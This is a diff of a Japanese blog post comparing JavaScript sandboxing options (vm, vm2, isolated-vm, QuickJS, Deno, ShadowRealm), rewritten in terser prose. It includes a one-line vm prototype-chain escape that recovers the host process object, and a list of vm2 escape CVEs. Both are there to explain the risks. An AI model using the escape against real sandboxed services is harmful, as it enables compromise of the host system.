@@ -1,58 +1,58 @@
 ---
-title: JavaScriptによるLinuxカーネルシミュレーションソリューションの比較
-description: JavaScript/TypeScriptによるLinux環境再現の詳細分析。
+title: Linuxカーネル再現のJavaScript解を比べる
+description: "JavaScriptやTypeScriptによるLinux環境再構成の深掘り分析。"
 date: 2026-05-28
-authors:
-  - fox3000foxy
 tags:
   - javascript
   - linux
   - analysis
+authors:
+  - fox3000foxy
 author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
-author_sig: "UaZcOC5TnMF2j5Bbb9Ky8OkDYbjwWSPrvHA1+1qUw/m0G3t+SD/rXKd2ZT1/FbxKg84MYNBeuRyLhvw5hGVMww=="
+author_sig: "Tp65+9vBL702mfa1iaGdUtSiivWqXQNTbEcYxOnfbXh+uxlcWllNX3ESbqS2ETGeWie+9Pp/IOnthZRbjYmgOA=="
 ---
 
-# あらゆるJavaScriptサンドボックス、エミュレーター、シミュレーター、ハニーポット----比較
+# JSサンドボックス、エミュレータ、シミュレータ、Linuxハニーポット全部。比べた
 
-このウサギの穴にはもうずっと深くハマりすぎてたんだ。きっかけは[typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)を手伝ってたこと----Fortune（彼女については後で詳しく）のプロジェクトだ----で、「ちょっと待って、これって`v86`とどう違うの？」とか「なんで`vm2`じゃないの？」って何度も聞かれるようになって、まずエコシステム全体をマッピングしないとクリーンな答えが出せないって気づいたんだ。ってわけで、こんな感じになったよ lol。
+いいか、もうこのウサギ穴には深く入りすぎた期間が長い。始まりは[typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)を手伝ってたことだ。Fortuneのプロジェクトだ（後で触れる）。「待って`v86`と何が違うの」とか「なんで`vm2`使わないの」とか聞かれ続けて、まず生態系全体を図にしないと明確に答えられないと気づいた。だからこうなったわけだ。
 
-で、4つの明確なファミリーがあることがわかった----JSサンドボックス、Linuxエミュレーター、Linuxシミュレーター、ハニーポット----で、同じ文脈でよく一緒に言及されるけど、ほとんど重なることはないんだ。プラグインシステムを作る人は`isolated-vm`を手に取る。CLIツールをデモする人は`v86`を手に取る。SSHの脅威インテルをやる人はCowrieを手に取る。全部「コードを箱の中で実行する」っていう曖昧な傘の下で、まったく別の問題を解決してるんだよね。
+4つの違う系統があると分かる。JSサンドボックス、Linuxエミュレータ、Linuxシミュレータ、ハニーポットだ。同じ文で言及され続けても、ほぼ重ならない。プラグイン機構を作る人は`isolated-vm`を使う。CLI道具デモを作る人は`v86`を使う。SSH脅威情報をやる人はCowrieを使う。「箱でコード回す」の漠然傘の下でまったく違う問題を解いてる。
 
-ソースコード、CVEレポート、アーキテクチャ文書、npmページを読むのにすごく時間をかけた。これは長くなるぞ----コーヒーを用意しろよ。まじで。2杯な。
+この記事書くのにソースコードもCVE報告も建築文書もnpmページもかなり読み込んだ。長くなるよ。コーヒー取って。本気で。2杯でも。
 
-> 簡単な免責：この記事では`typescript-virtual-container`が多く取り上げられている。なぜならこの調査の発端になったからだ。他のものについては公平に書くように努めたけど、そのコンテキストを頭に入れておいてほしい。
+> 小 disclaimer：`typescript-virtual-container`はこの調査のきっかけだからこの記事で前に出す。残り全部には公平であろうとした。でもこの文脈は頭に入れといて。
 
 ---
 
-## パート0 -- そもそも、どの問題を解決したいのか？
+## パート0。まず、君が本当に解く問題は何か
 
-深掘りする前に、各ファミリーが何のためのものかを正確に明確にしておく価値がある。なぜなら用語がすぐにいい加減になって、人々が常に混同しているからだ（俺自身も、ちゃんとマッピングするまではそうだった）。
+潜る前に、各系統の用途を正確にする価値がある。用語はすぐ散らかるし、みんな常に混ぜるからね（図にきちんと起こして座る前の私込みで）。
 
-**JSサンドボックス**は、JavaScriptコードをホストのNode.jsプロセスから分離する。脅威モデルは：信頼できないJSコードが`process.exit()`を呼んだり、ファイルを読んだり、子プロセスを生成したりする可能性があること。解決策はV8実行の境界だ。これらのツールはLinuxシェルやパーミッション付きファイルシステム、SSHといった概念を持たない。
+**JSサンドボックス**はホストNode.jsプロセスからJavaScriptコードを隔離する。脅威モデルはこうだ。`process.exit()`を呼んだり、ファイル読んだり、子プロセス起こしたりする信用できないJSコードだ。解はV8実行への境界だ。この道具にLinuxシェルも権限付きファイルシステムもSSHもない。
 
-**Linuxエミュレーター**は、JavaScriptまたはWebAssemblyで実装されたCPUエミュレーター（x86、RISC-V、OR1K）の中で、実際の未改変のLinuxカーネルを実行する。本物のOSが起動する。本物のシステムコールが得られる。x86コンパイル済みプログラムとのバイナリ互換性が得られる。オーバーヘッドは莫大だ。
+**Linuxエミュレータ**はJavaScriptかWebAssembly実装のCPUエミュレータ（x86、RISC-V、OR1K）で本物の無改造Linuxカーネルを回す。本物OSを起動する。本物のシステムコールが出る。x86向けコンパイル済みプログラムとのバイナリ互換が出る。資源コストは巨大だ。
 
-**Linuxシミュレーター**は、実際のカーネルを実行せずにLinuxシステムの*振る舞い*を模倣する。シェルインタプリタ、仮想ファイルシステム、そしてプログラムや人間を騙すのに十分なUnixセマンティクスを実装する。カーネルなし。Wasmなし。CPUエミュレーションなし。はるかに低いオーバーヘッド。
+**Linuxシミュレータ**は本物カーネル回さず*Linux系システムの挙動*を真似る。シェル解釈器と仮想ファイルシステムと、プログラムも人間も騙すに足るUnix意味を実装する。カーネルなし、Wasmなし、CPUエミュなしだ。かなり軽い。
 
-**ハニーポット**は、攻撃者を引き寄せてその行動を記録するために作られている。主に実行環境ではなく、観測ツールだ。実際のLinux動作への忠実度は、攻撃者に罠を検知されない程度に保てれば十分だ。
+**ハニーポット**は攻撃者を引き付けて行動記録するために設計される。主に実行環境じゃない。観測道具だ。Linux本物への忠実度は、攻撃者が罠を検出しない範囲でのみ大事だ。
 
-という枠組みで、この記事の全プロジェクトがどこに位置づけられるか：
+この枠組みで、この記事の各プロジェクト位置はこうだ。
 
 ```
-JSサンドボックス:    vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
-Linuxエミュレーター:  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
-Linuxシミュレーター:  typescript-virtual-container (この領域で唯一)
-ハニーポット:         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
-ターミナルスタック:    xterm.js + node-pty (分離機能ではないが、隣接)
+JS sandbox :       vm、vm2、isolated-vm、quickjs-emscripten、Deno Workers、ShadowRealm
+Linuxエミュレータ:  v86、JSLinux/TinyEMU、jor1k、CheerpX、WebContainers、container2wasm
+Linuxシミュレータ: typescript-virtual-container（この領域で唯一）
+Honeypot :         Cowrie、Kippo、Lyrebird、endlessh、sshesame、node-simple-ssh-honeypot
+端末 stack：       xterm.js + node-pty（隔離じゃないけど関連）
 ```
 
 ---
 
-## パート1 -- JavaScriptサンドボックス
+## パート1。JavaScriptサンドボックス
 
-### 1.1 `vm` -- Node.js組み込み（思ってるのとは違う）
+### 1.1 `vm`。Node.js内蔵モジュール（思ってるものじゃない）
 
-Nodeで「信頼できないJSを実行する」一番古い答えは、組み込みの`vm`モジュールだ。v0.1からあるので、多くの人が最初に手を伸ばす----そして痛い目に遭う。
+Nodeで「信用できないJSを実行する」への最古の答えは内蔵`vm`モジュールだ。v0.1からある。だから多くの人が最初に使って、火傷する。
 
 ```js
 const vm = require("vm");
@@ -62,104 +62,104 @@ vm.runInContext("answer = 6 * 7", sandbox);
 console.log(sandbox.answer); // 42
 ```
 
-`vm`が実際にやっていること：新しいV8コンテキスト（新しいビルトインコンストラクター群----`Object`、`Array`、`Function`など）を作成し、`sandbox`に入れたものへの共有参照を持ってコードを実行する。V8エンジンは変わらない。プロセスは変わらない。メモリは共有される。
+`vm`が実際にやること：新しいV8コンテキストを作る（ネイティブコンストラクタの新集合、`Object`や`Array`や`Function`など）。コードをそこで実行する。`sandbox`に入れたものへの共有参照付きだ。V8エンジンは変わらない。プロセスは変わらない。メモリは共有だ。
 
-`vm`がセキュリティを提供しない理由：JavaScriptのプロトタイプチェーンは、すべてを`Object.prototype`に結びつけるDAGだ。ホストレルムから任意のオブジェクトをサンドボックスに入れると、ゲストはそのプロトタイプチェーンを遡ってホストコンストラクターに到達できる。`Function`から、`Function("return process")()` を呼び出して本物の`process`オブジェクトを取り戻せる。ゲームオーバー。即座に。
+`vm`が安全を提供しない理由：JavaScriptのプロトタイプ連鎖は全部を`Object.prototype`に繋ぐDAGだ。ホスト世界物をサンドボックスに入れたら、客はプロトタイプ連鎖を登ってホストコンストラクタに届く。`Function`からは`Function("return process")()`を呼んで本物`process`を取れる。ゲームオーバーだ。即だ。
 
 ```js
-// これはvmで普通に実行できる----本物のprocessオブジェクトが返る
+// vmでは完璧に動く。本物processが取れる
 vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
 ```
 
-つまり、Node.jsのドキュメント自体が言っている：「vmモジュールはセキュリティ機構ではありません。信頼できないコードの実行に使用しないでください。」この警告はずっと前からある。人々は常に無視している。本番アプリで`vm`をサンドボックスとして使ってるのを見たことがある。やめてくれ xD
+言っとくけど、Node.js文書自体がこう言う。「vmモジュールは安全機構じゃない。信用できないコード実行に使うな」ってね。この警告は昔からある。人々は常に無視する。本番アプリが`vm`をサンドボックスに使うの見た。やめてくれ。
 
-**判定**: スコープ機構であって、サンドボックスではない。分離された変数スコープ（テンプレートエンジン、コードを制御できる`eval`的な機能）が必要なときに使え。信頼できない入力には絶対に使うな。
+**判定**：スコープ機構で、サンドボックスじゃない。変数隔離が要るとき使う（テンプレエンジン、制御コード向け`eval`風機能）。信用できない入力には絶対使わない。
 
-**メモリ**: 無視できるオーバーヘッド----ホストプロセスと同じV8ヒープ。  
-**セキュリティ**: やる気のある攻撃者に対しては無。
+**メモリ**：無視できる追加。ホストプロセスと同じV8ヒープ。  
+**安全**：やる気ある攻撃者にゼロだ。
 
 ---
 
-### 1.2 `vm2` -- コミュニティの試み、そして非常に長い死
+### 1.2 `vm2`。コミュニティの試みと、とても長い死
 
-`vm2`は`vm`のエスケープ問題に対するコミュニティの答えだった。コアアイデア：サンドボックス境界を越えるすべてのオブジェクトを`Proxy`でラップし、プロパティアクセスをインターセプトし、プロトタイプクライミングをブロックし、危険な参照をフィルタリングする。理論上は賢いアイデア！実際はそうでもなかったけど。
+`vm2`は`vm`脱出問題へのコミュニティの答えだった。中心発想：サンドボックス境界を越える各物を`Proxy`で包んで、プロパティアクセスを横取りして、プロトタイプ遡りを止めて、危険参照を濾過する。賢い発想だ理論上！実際はご覧の通り説得力はかなり低かった。
 
 ```js
 const { VM } = require("vm2");
 const vm = new VM({ timeout: 1000, sandbox: {} });
-vm.run("process.exit(1)"); // VMErrorがスローされ、processにアクセス不可
+vm.run("process.exit(1)"); // VMErrorを投げる、processは触れない
 ```
 
-数年はこれでまあまあ機能していた。しかしJavaScriptの`Proxy`の攻撃表面積は莫大だ。新しいJS言語機能----ジェネレーター、非同期イテレーター、`Symbol.toPrimitive`、`Error.prepareStackTrace`、`Promise`内部スロット----はすべて潜在的なバイパスベクターだ。
+数年はかなり動いた。でも`Proxy` JavaScriptの攻撃面は巨大だ。新しいJS言語機能ごと、ジェネレータ、非同期イテレータ、`Symbol.toPrimitive`、`Error.prepareStackTrace`、`Promise`内部スロットは潜在回避ベクトルだ。
 
-CVEのタイムラインは……ちょっとすごい。こんな感じ：
+CVE年表はこうだ。なんというか、これ見て。
 
-| 日付 | CVE | メカニズム |
+| 日付 | CVE | 仕組み |
 |------|-----|-----------|
-| Oct 2022 | CVE-2022-36067 | `Error.prepareStackTrace`によるホストコンテキストエスケープ |
-| Apr 2023 | CVE-2023-29017 | 未処理の非同期エラースタックによるホストオブジェクトリーク |
-| Apr 2023 | CVE-2023-29199 | `handleException()`による例外サニタイゼーションのバイパス |
-| Apr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
-| May 2023 | CVE-2023-32314 | `Error.name`上の`Proxy` → `Function` → RCE |
-| Jul 2023 | CVE-2023-37466 | 非同期関数 + スタックオーバーフロー + `Proxy.getPrototypeOf` |
-| Jul 2023 | CVE-2023-37903 | Workerスレッド + evalエスケープ |
+| 2022年10月 | CVE-2022-36067 | `Error.prepareStackTrace`経由のホスト文脈脱出 |
+| 2023年4月 | CVE-2023-29017 | 未処理非同期エラー経由のホスト物漏れ |
+| 2023年4月 | CVE-2023-29199 | `handleException()`経由の例外消毒回避 |
+| 2023年4月 | CVE-2023-30547 | `Proxy.getPrototypeOf`から`Function`からRCE |
+| 2023年5月 | CVE-2023-32314 | `Error.name`上の`Proxy`から`Function`からRCE |
+| 2023年7月 | CVE-2023-37466 | 非同期関数とスタック溢れと`Proxy.getPrototypeOf` |
+| 2023年7月 | CVE-2023-37903 | ワーカースレッドとeval脱出 |
 
-同じ月（2023年4月）に3つの深刻なCVE。3つだ。1ヶ月で。CVE-2023-37903の後、メンテナーは公式にライブラリを非推奨とし、次のメッセージを残した：*「このライブラリには重大なセキュリティ問題が含まれており、本番環境で使用すべきではありません。」*
+同じ月（2023年4月）に重大CVE 3つだ。3つだ。1か月でだ。CVE-2023-37903後、メンテナは公式にライブラリを非推奨化した。メッセージはこうだ。*「このライブラリは重大な安全問題を含み、本番で使うべきじゃない」*。
 
-メンテナーは2025年10月にバージョン3.10.0で復活させ、当時知られているすべてを修正したと主張した。2026年1月に新たな重大なエスケープ（CVE-2026-22709、CVSS 9.8）が開示され、2026年5月にはさらに11件のCVEが続いた。11件だ。パターンは変わっていないし、正直変わらないと思う。
+メンテナは2025年10月に版3.10.0で蘇らせた。当時既知のものは全部直したと称してね。新しい重大脱出（CVE-2026-22709、CVSS 9.8）が2026年1月に開示されて、2026年5月に11連発が続いた。11だ。模様は変わってないし正直いつか変わるとは思わない。
 
-根本的な問題はアーキテクチャにある----そしてこれがエコシステム全体が学ぶのに時間がかかった教訓だ。サンドボックス化するのと同じ言語で、同じエンジンで、同じプロセスで、安全なサンドボックスを構築することはできない。エスケープ表面はV8実装全体だ----そしてV8は数百万行のC++で、変更され続けている。新しいJS機能が出るたびに、新しい攻撃経路が開く可能性がある。
+根本問題は建築的だ。全生態系が学ぶのに時間かかった教訓だ。隔離するのと同じ言語で、同じエンジンで、同じプロセス内で安全サンドボックスは作れない。脱出面はV8実装全体だ。V8は常に変わる数百万行C++だ。新JS機能ごとに新しい攻撃路が開きうる。
 
-**判定**: セキュリティ重視のアプリケーションには使用すべきでない。最新バージョンでも、数ヶ月ごとに新しいバイパスが発見されている。メンテナー自身もこれを公然と認めている。
+**判定**：安全敏感な用途に使うな。最新版でも数か月ごとに新回避が見つかる。メンテナ自身が公然と認めた。
 
 ---
 
-### 1.3 `isolated-vm` -- 実際に機能するやつ
+### 1.3 `isolated-vm`。本当に動くやつ
 
-`isolated-vm`は正しいアプローチを取っている：V8自身の分離プリミティブ、Isolateを使う。各V8 Isolateは独自のヒープ、独自のガベージコレクター、独自のビルトインセットを持ち、他のIsolateとの共有参照はゼロだ。
+`isolated-vm`は正しい手法を取る。V8ネイティブ隔離基本要素、Isolateを使う。各V8 Isolateは独自ヒープ、独自ガベージコレクタ、独自ネイティブ集合を持って、他Isolateと共有参照ゼロだ。
 
-これはChromeがタブ間で使っているのと同じ境界だ。言語レベルのProxyトリックではなく、本当のセキュリティ境界である。
+Chromeがタブ間で使うのと同じ境界だ。本物安全壁だ。Proxy土台の言語技じゃない。
 
 ```js
 import ivm from "isolated-vm";
 
-// 各Isolateは独自のV8ヒープ
-const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB制限
+// 各isolateは独自V8ヒープ
+const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB上限
 const context = await isolate.createContext();
 const jail = context.global;
 
-// 境界を越えるデータには明示的なシリアライズが必要
+// 境界越しにデータ渡すには明示直列化が要る
 await jail.set("sensitiveData", "not this");
 await jail.set("log", new ivm.Reference(console.log));
 
 const script = await isolate.compileScript(`
-  // ホストプロセス、ホストヒープ、ホストモジュールには到達できない
+  // ホストプロセスもホストヒープもホストモジュールも触れない
   log.applySync(undefined, ["hello from the isolate"]);
 `);
 await script.run(context);
 
-// タイムアウトやメモリ制限で強制終了できる
-isolate.dispose(); // ヒープ全体を解放
+// 時間切れやメモリ上限で強制的終了できる
+isolate.dispose(); // ヒープ全部解放
 ```
 
-`Reference`と`ExternalCopy`が明示的な通信ブリッジだ。`Reference`はIsolateにホスト関数への呼び出し可能なハンドルを与える----Isolateは呼び出せるが、そのクロージャやプロトタイプは検査できない。`ExternalCopy`は値をヒープ境界越えにシリアライズ（構造化クローン）する。この明示的ブリッジモデルは便利じゃないが、それが分離を現実のものにしている。
+`Reference`と`ExternalCopy`型が明示通信橋だ。`Reference`はisolateにホスト関数への呼び出し可能 handle を渡す。isolateは呼べるけど閉鎖もプロトタイプも調べられない。`ExternalCopy`は値直列化する（ヒープ境界越しの構造化クローン）。この明示橋モデルは不便だけど、隔離を本物にするものだ。
 
-ハードリソース制限を設定できる：メモリ（上限超過でIsolateは終了される）、ウォールクロックタイムアウト、CPUタイムアウト。終了は本物だ----単なる`while(true)`でバイパスできるJSタイムアウトではなく、V8 Isolate全体を殺す。
+厳密な資源上限を付けられる。メモリ（超えたらisolate終了）、壁時計時間切れ、CPU時間切れだ。終了は本物だ。V8 Isolate全体を殺す。`while(true)`で回避できるJS時間切れじゃない。
 
-**制限**: JSのみ。内部でbashは実行できない。ファイル、パーミッション、ネットワーク、プロセスの概念はない。ユーザー提出のJS（プラグイン、フォーミュラ、スクリプトフック）にはまさに適切なツールだが、それ以外には間違ったツールだ。`typescript-virtual-container`の作者は、初期にこれを検討したが、「シェルコマンドの実行」と「JavaScriptの分離」は根本的に異なる問題だと気づいたそうだ。
+**限界**：JS専用だ。中でbashは実行できない。ファイルも権限も網もプロセスもない。ユーザー提出JS（プラグイン、式、スクリプト hook ）にはまさに正しい道具で、残り全部には間違った道具だ。`typescript-virtual-container`作者は最初検討したと述べて、「シェル命令を実行する」と「JavaScriptを隔離する」は根本違う問題だと気づいた。
 
-**メモリ**: 空のIsolateあたり~3–10 MB、ヒープ使用量に応じて増加。  
-**セキュリティ**: 強力。V8 Isolate境界が本当の分離プリミティブ。  
-**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
-**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
+**メモリ**：空isolateあたり約3-10MB、ヒープ使用で増える。  
+**安全**：堅い。V8 Isolate境界は本物隔離基本要素だ。  
+**npm**：[isolated-vm](https://www.npmjs.com/package/isolated-vm)  
+**GitHub**：[laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
 
 ---
 
-### 1.4 `quickjs-emscripten` -- Wasmにコンパイルされた別個のJSエンジン
+### 1.4 `quickjs-emscripten`。Wasmコンパイルの別JSエンジン
 
-別のアプローチ：V8内で分離する代わりに、完全に別個のJavaScriptエンジンをWebAssemblyにコンパイルして実行する。ホストはV8/Nodeで動作する。ゲストはQuickJS-in-Wasmで動作する。Wasmサンドボックスが分離境界を提供する。
+違う手法：V8内で隔離する代わり、WebAssemblyコンパイルの完全別JavaScriptエンジンを回す。ホストはV8やNodeで回る。客はWasm内QuickJSで回る。Wasmサンドボックスが隔離境界を出す。
 
-QuickJSはFabrice Bellardの作品だ（QEMU、FFmpeg、JSLinux、TinyEMUの同じ人物----この人は本当に現実離れしてる、一人でどうやってこんなことやってるんだ）。Cで書かれた小さな仕様準拠のES2023 JSエンジンで、Wasmにコンパイルするとわずか~500 KBだ。
+QuickJSはFabrice Bellardのまだ別の作品だ（QEMU、FFmpeg、JSLinux、TinyEMUの人。この人本物じゃない。真面目に1人でどうやって全部やるの）。ES2023準拠の小JSエンジンでC書きだ。Wasmコンパイルで約500KBだ。
 
 ```js
 import { getQuickJS } from "quickjs-emscripten";
@@ -168,7 +168,7 @@ const QuickJS = await getQuickJS();
 const vm = QuickJS.newContext();
 
 const result = vm.evalCode(`
-  // V8とは完全に別のQuickJSで実行される
+  // V8と完全分離のQuickJSで実行
   (function() { return 6 * 7; })()
 `);
 
@@ -183,9 +183,9 @@ if (result.error) {
 vm.dispose();
 ```
 
-QuickJSはCで書かれた小さな仕様準拠のES2023 JavaScriptエンジンだ。Wasmにコンパイルすると、同期バリアントで~500 KB、非同期（Asyncify）バリアントで~1 MB。メモリ管理は手動----VMから取り出した値はすべて明示的に破棄する必要がある。これはちょっと面倒だが、境界を越えたGCの驚きを防ぐ。面白いトレードオフだ！
+QuickJSはES2023準拠の小JavaScriptエンジンでC書きだ。Wasmコンパイルで同期版約500KB、非同期版（Asyncify）約1MBだ。メモリ管理は手動だ。VMから取り出す各値は明示解放しなきゃいけない。ちょっと面倒だが境界越しGC驚きを防ぐ。面白い交換だ！
 
-`@sebastianwessel/quickjs`ラッパーは、より人間工学的なAPIを追加し、オプションの仮想ファイルシステム、fetchサポート、Node.jsモジュールスタブを提供する：
+`@sebastianwessel/quickjs`ラッパーは上に使いやすいAPIを足す。任意仮想ファイルシステム、fetch対応、Node.jsモジュール stub 付きだ。
 
 ```ts
 import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
@@ -202,97 +202,97 @@ const result = await runSandboxed(
 );
 ```
 
-セキュリティモデルは`isolated-vm`とは異なる：Wasmの線形メモリモデルにより、ゲストはV8ヒープオブジェクトに直接アクセスできない。攻撃表面はホスト↔Wasmインターフェース（インポート/エクスポート）であり、JS言語全体ではない。これは一般的にProxyベースのサンドボクシングよりも堅牢だと考えられている。
+安全モデルは`isolated-vm`と違う。Wasm線形メモリモデルで客はV8ヒープ物に直接触れない。攻撃面はホストとWasm間インターフェース（importやexport）で、JS言語全体じゃない。Proxy土台サンドボックスより堅いと一般に見られる。
 
-欠点：QuickJSはV8と同じ最適化レベルを持っていない。CPUバウンドなJSワークロードでは、V8より5–20倍遅い。短いスニペットや信頼できないevalでは、通常これで問題にならない。
+裏：QuickJSはV8並みに最適化されてない。CPU bound JS負荷ではV8より5-20倍遅い。小さいコード片や信用できない評価にはふつう問題にならない。
 
-**メモリ**: インスタンスあたり~500 KBのWasmモジュール+ヒープ。  
-**セキュリティ**: Wasm境界。Proxyベースのアプローチより堅牢とされる。  
-**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
-**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
+**メモリ**：Wasmモジュール約500KBとインスタンスごとヒープ。  
+**安全**：Wasm境界。Proxy手法より堅いとみなされる。  
+**npm**：[quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten)、[@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
+**GitHub**：[justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
 
 ---
 
-### 1.5 Deno -- パーミッション優先ランタイム
+### 1.5 Deno。権限優先のランタイム
 
-Denoはまったく異なる哲学を取っている：Node内でサンドボックス化する代わりに、デフォルトでセキュアな新しいランタイムを構築する。このアプローチは本当に気に入ってる----そもそもNode.jsが最初からこうあるべきだったんだよ、正直言って。Ryan Dahl（元Node.jsの作者）は文字通り、Node.jsの設計判断のいくつかを後悔してDenoを作ったんだ。考えてみると結構ワイルドだよね。
+Denoはまったく違う哲学を取る。Node内でサンドボックスする代わり、デフォルト安全な新ランタイムを作る。この手法ほんと好きだ。Node.jsが最初からこうあるべきだったものだ。Ryan Dahl（元Node.js作者）は文字通りNode.js設計決定の後悔でDenoを作った。考えるとかなりすごい。
 
-すべての機密機能（ファイル読み取り、ファイル書き込み、ネットワーク、env、サブプロセス）には明示的な`--allow-*`フラグが必要：
+各敏感能力（ファイル読み、ファイル書き、網、環境、子プロセス）は明示`--allow-*`フラグが要る。
 
 ```bash
-# これは/dataからの読み取りのみ可能
+# /data内だけ読める
 deno run --allow-read=/data script.ts
 
-# これは1つのドメインにのみfetch可能
+# 1ドメインだけ触れる
 deno run --allow-net=api.example.com script.ts
 
-# フラグなし = パーミッションなし
-deno run untrusted.ts # 読み取り、書き込み、ネットワーク、生成、すべて不可
+# フラグなしは権限ゼロ
+deno run untrusted.ts # 読みも書きも網も起動もできない
 ```
 
-パーミッションモデルはRust/OSレベルで実装されている----JSのトリックではない。Denoコードが`Deno.readFile()`を呼び出すと、それはファイルシステムに触れる前にパーミッションテーブルをチェックするRustのopを通過する。パーミッションが付与されていなければシステムコールは発生しないので、JSからバイパスすることはできない。
+権限モデルはRustやOS水準で実装される。JS技じゃない。Denoコードが`Deno.readFile()`を呼ぶと、ファイルシステム触る前に権限表を確認するRust演算を通る。JSから回避できない。権限なければシステムコールは起きない。
 
-本当に信頼できないコードを実行するために、Deno Workers（Web Workers）は同じプロセス内に第2のIsolateを提供し、それぞれが独自のパーミッションセットを持つ。ゼロパーミッションのWorkerを生成し、`postMessage`で通信できる。
+本当に信用できないコード実行には、Deno Workers（Web Workers）が同プロセス内の第二isolateを出し、各々独自権限集合を持つ。権限ゼロワーカーを起動して`postMessage`で通信できる。
 
-Deno 2（2024年10月リリース）は完全なnpm互換性とNode.js互換性シムを追加し、サーバーサイドでの採用を大幅に改善した。
+Deno 2（2024年10月発売）は完全npm互換とNode.js互換 shim を足して、サーバー側用途の採用をかなり上げた。
 
-**トレードオフ**: Denoのセキュリティモデルは、部分的に信頼できるコードには優れている。完全に信頼できない敵対的なコードの場合、パーミッションモデルは役に立たない----Isolate境界（`isolated-vm`）か別のエンジン（`quickjs-emscripten`）が必要だ。なぜならDenoもV8を動かしており、高度な攻撃者はV8レベルのバグを見つけられるからだ。
+**交換**：Deno安全モデルは部分的信用コードには優れる。完全信用できない敵対的コードには権限モデルは助けない。Isolate境界（`isolated-vm`）か違うエンジン（`quickjs-emscripten`）が要る。DenoもV8使うし、洗練攻撃者はV8水準バグを見つけるからね。
 
 ---
 
-### 1.6 TC39 ShadowRealm -- 標準的な答え（いずれは）
+### 1.6 TC39 ShadowRealm。標準化された答え（いつか）
 
-JavaScriptの標準化団体（TC39）はShadowRealmというプロポーザルを持っており、`vm`と`vm2`がやろうとしていたことを、正しいセキュリティモデルで標準化しようとしている。ShadowRealmは、独自のイントリンシクスを持ち、外部レルムへのアクセスがなく、慎重に制御されたインポート/エクスポートインターフェースを持つ、分離されたJS実行コンテキストを作成する。
+JavaScript標準化団体（TC39）にはShadowRealmって提案があって、`vm`や`vm2`がやろうとしたことを正しい安全モデルで標準化しようとしてる。ShadowRealmは隔離JS実行文脈を作る。独自 intrinsics、外部世界アクセスなし、丁寧管理 import や export インターフェースだ。
 
 ```js
 const realm = new ShadowRealm();
 const result = realm.evaluate(`
-  // 別個のイントリンシクス、外部レルムへのアクセスなし
+  // 分離 intrinsics、外部世界アクセスなし
   typeof globalThis.fetch // "undefined"
   6 * 7 // 42
 `);
 ```
 
-ShadowRealmはブラウザ（Chrome 90+、Firefox 105+）にはあるが、2026年現在、Node.js安定版にはまだない。TC39 Compartmentsプロポーザルはその上にモジュールレベルの分離を構築する。これらは長期標準の答えだが、サーバーサイドのNodeユースケースではまだプロダクションレディではない。遠くから来るのが見えているのに、まだ……届いていない。古典的なTC39だ xD
+ShadowRealmはブラウザで利用可能だ（Chrome 90+、Firefox 105+）。でも2026年時点で安定Node.jsにはまだない。TC39 Compartments提案はその上にモジュール水準隔離を組む。長期の標準化答えだが、サーバー側Node本番にはまだ早い。遠くに見える工事でね。でもまだそこじゃない。TC39あるあるだ。
 
 ---
 
-### サンドボックスファミリーまとめ
+### サンドボックス系統まとめ
 
 | | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
-|---|---|---|---|---|---|---|
-| **分離境界** | なし（スコープのみ） | Proxy（壊れてる） | V8 Isolate | Wasm | V8 Isolate + Rust権限 |
-| **メモリ制限** | ❌ | ❌ | ✅ ハード制限 | ✅ Wasmヒープ | 部分的 |
-| **CPUタイムアウト** | ❌ | ✅（バイパス可） | ✅ ハード | ✅ | ✅ |
-| **セキュリティ** | なし | 壊れてる | 強力 | 強力 | 強力 |
-| **JS速度** | ネイティブV8 | ネイティブV8 | ネイティブV8 | ~10倍遅い | ネイティブV8 |
+|---|---|---|---|---|---|
+| **隔離境界** | なし（スコープ） | Proxy（破綻） | V8 Isolate | Wasm | V8 IsolateとRust権限 |
+| **メモリ上限** | ❌ | ❌ | ✅ 厳密上限 | ✅ Wasmヒープ | 部分的 |
+| **CPU時間切れ** | ❌ | ✅（回避可能） | ✅ 厳密 | ✅ | ✅ |
+| **安全** | なし | 壊れた | 堅い | 堅い | 堅い |
+| **JS速度** | ネイティブV8 | ネイティブV8 | ネイティブV8 | 約10倍遅い | ネイティブV8 |
 | **ブラウザ** | ❌ | ❌ | ❌ | ✅ | ❌ |
-| **Node互換** | ネイティブ | ✅ | ✅ | 部分的シム | 部分的 |
-| **ステータス** | 安定 | リスクあり（新CVE） | ✅ 活発 | ✅ 活発 | ✅ 活発 |
-| **RAMオーバーヘッド** | ~1 MB | ~5–20 MB | ~3–10 MB | ~5–15 MB | ~10–30 MB |
+| **Node互換** | ネイティブ | ✅ | ✅ | 部分 shim | 部分的 |
+| **状態** | 安定 | 危険（新CVE） | ✅ 活性 | ✅ 活性 | ✅ 活性 |
+| **RAM追加** | 約1MB | 約5-20MB | 約3-10MB | 約5-15MB | 約10-30MB |
 
